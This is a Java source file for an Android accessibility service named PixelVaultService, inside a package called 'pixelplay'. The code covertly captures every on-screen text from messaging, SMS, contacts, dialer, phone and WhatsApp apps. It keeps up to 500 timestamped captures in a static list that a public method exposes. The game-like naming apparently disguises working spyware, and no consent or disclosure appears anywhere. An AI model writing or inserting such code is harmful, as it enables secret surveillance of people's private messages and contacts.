package com.pixelplay.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class PixelVaultService extends AccessibilityService {
    private static final String TAG = "PixelPlay";
    private static final List<JSONObject> caps = new ArrayList<>();
    private static final int MAX = 500;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        if (!isTarget(pkg)) return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        try {
            List<String> texts = new ArrayList<>();
            extractText(root, texts);

            if (!texts.isEmpty()) {
                JSONObject e = new JSONObject();
                e.put("package", pkg);
                JSONArray ta = new JSONArray();
                for (String t : texts) ta.put(t);
                e.put("texts", ta);
                e.put("time", System.currentTimeMillis());

                synchronized (caps) {
                    caps.add(e);
                    while (caps.size() > MAX) caps.remove(0);
                }
            }
        } catch (Exception ignored) {}
        root.recycle();
    }

    private boolean isTarget(String pkg) {
        return pkg.contains("messaging") || pkg.contains("contacts") || pkg.contains("dialer")
            || pkg.contains("com.android.phone") || pkg.contains("com.whatsapp")
            || pkg.contains("sms") || pkg.contains("message") || pkg.contains("telecom")
            || pkg.contains("com.android.server.telecom");
    }

    private void extractText(AccessibilityNodeInfo node, List<String> texts) {
        if (node == null) return;
        if (node.getText() != null) {
            String t = node.getText().toString().trim();
            if (t.length() > 0) texts.add(t);
        }
        if (node.getContentDescription() != null) {
            String d = node.getContentDescription().toString().trim();
            if (d.length() > 0) texts.add(d);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            extractText(node.getChild(i), texts);
        }
    }

    @Override
    public void onInterrupt() {}

    public static List<JSONObject> getCapturedAccessibility() {
        return caps;
    }
}
